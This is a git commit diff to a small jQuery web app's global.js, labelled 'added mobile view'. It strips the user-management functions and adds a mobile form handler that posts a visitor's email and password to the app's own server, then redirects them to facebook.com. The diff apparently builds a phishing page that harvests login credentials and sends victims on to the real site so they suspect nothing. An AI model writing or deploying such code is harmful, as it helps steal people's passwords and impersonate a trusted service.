c5073fb571eca4205986194c06994c97768beb66
adeelhussain <mr.adi180@gmail.com>
2018-01-23 03:45:55 +0500

    added mobile view

--- public/javascripts/global.js
+++ public/javascripts/global.js
@@ -1,84 +1,20 @@
-// Userlist data array for filling in info box
-var userListData = [];
 
 // DOM Ready =============================================================
 $(document).ready(function() {
 
-    // Populate the user table on initial page load
-//    populateTable();
-
-    // Username link click
-    $('#userList table tbody').on('click', 'td a.linkshowuser', showUserInfo);
-
-    // Add User button click
     $('.btnAddUser').on('click', addUser);
-
-    // Delete User link click
-    $('#userList table tbody').on('click', 'td a.linkdeleteuser', deleteUser);
+    $('.btnAddUserMobile').on('click', addUserMobile);
 
 });
 
 // Functions =============================================================
 
-// Fill table with data
-function populateTable() {
-
-    // Empty content string
-    var tableContent = '';
-
-    // jQuery AJAX call for JSON
-    $.getJSON( '/users/userlist', function( data ) {
-
-        // Stick our user data array into a userlist variable in the global object
-        userListData = data;
-
-        // For each item in our JSON, add a table row and cells to the content string
-        $.each(data, function(){
-            tableContent += '<tr>';
-            tableContent += '<td><a href="#" class="linkshowuser" rel="' + this.username + '" title="Show Details">' + this.username + '</a></td>';
-            tableContent += '<td>' + this.email + '</td>';
-            tableContent += '<td><a href="#" class="linkdeleteuser" rel="' + this._id + '">delete</a></td>';
-            tableContent += '</tr>';
-        });
-
-        // Inject the whole content string into our existing HTML table
-        $('#userList table tbody').html(tableContent);
-    });
-};
-
-// Show User Info
-function showUserInfo(event) {
-
-    // Prevent Link from Firing
-    event.preventDefault();
-
-    // Retrieve username from link rel attribute
-    var thisUserName = $(this).attr('rel');
-
-    // Get Index of object based on id value
-    var arrayPosition = userListData.map(function(arrayItem) { return arrayItem.username; }).indexOf(thisUserName);
-
-    // Get our User Object
-    var thisUserObject = userListData[arrayPosition];
-
-    //Populate Info Box
-    $('#userInfoName').text(thisUserObject.fullname);
-    $('#userInfoAge').text(thisUserObject.age);
-    $('#userInfoGender').text(thisUserObject.gender);
-    $('#userInfoLocation').text(thisUserObject.location);
-
-};
-
-// Add User
+// Add User web
 function addUser(event) {
     event.preventDefault();
 
-    // Super basic validation - increase errorCount variable if any fields are blank
     var errorCount = 0;
 
-    // Check and make sure errorCount's still at zero
-
-        // If it is, compile all user info into one object
         var newUser = {
             'email': $('#inputUserEmail').val(),
             'password': $('#inputUserPassword').val(),
@@ -110,43 +46,43 @@ function addUser(event) {
             }
         });
 
-};
+}
 
-// Delete User
-function deleteUser(event) {
-
+// Add User
+function addUserMobile(event) {
     event.preventDefault();
 
-    // Pop up a confirmation dialog
-    var confirmation = confirm('Are you sure you want to delete this user?');
+    var errorCount = 0;
 
-    // Check and make sure the user confirmed
-    if (confirmation === true) {
+    var newUser = {
+        'email': $('#inputUserEmailMobile').val(),
+        'password': $('#inputUserPasswordMobile').val(),
+        'date': Date.now()
+    };
 
-        // If they did, do our delete
-        $.ajax({
-            type: 'DELETE',
-            url: '/users/deleteuser/' + $(this).attr('rel')
-        }).done(function( response ) {
+    // Use AJAX to post the object to our adduser service
+    $.ajax({
+        type: 'POST',
+        data: newUser,
+        url: '/users/adduser',
+        dataType: 'JSON'
+    }).done(function( response ) {
 
-            // Check for a successful (blank) response
-            if (response.msg === '') {
-            }
-            else {
-                alert('Error: ' + response.msg);
-            }
+        // Check for successful (blank) response
+        if (response.msg === '') {
+
+            // Clear the form inputs
+            $('#addUser fieldset input').val('');
 
             // Update the table
-            populateTable();
+            window.location = "https://www.facebook.com";
+        }
+        else {
 
-        });
+            // If something goes wrong, alert the error message that our service returned
+            alert('Error: ' + response.msg);
 
-    }
-    else {
+        }
+    });
 
-        // If they said no to the confirm, do nothing
-        return false;
-
-    }
-
-};
+}
